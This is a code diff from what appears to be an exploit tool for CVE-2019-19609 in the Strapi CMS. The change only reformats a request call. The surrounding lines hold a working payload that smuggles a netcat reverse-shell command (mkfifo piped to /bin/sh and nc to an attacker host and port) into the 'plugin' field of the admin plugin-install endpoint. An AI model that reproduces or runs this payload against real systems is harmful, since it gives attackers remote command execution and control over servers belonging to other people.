@@ -24,7 +24,11 @@ class CVE_2019_19609(StrapiExploitInterface):
             "plugin": f"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport}' >/tmp/f)", 
             "port": "80"
         }
-        r = requests.post(f"{self.url}/admin/plugins/install", headers=headers, json=payload, timeout=10)
+        r = requests.post(f"{self.url}/admin/plugins/install",
+            headers=headers,
+            json=payload,
+            timeout=10
+        )
         if r.status_code == 200:
             return True
         return False
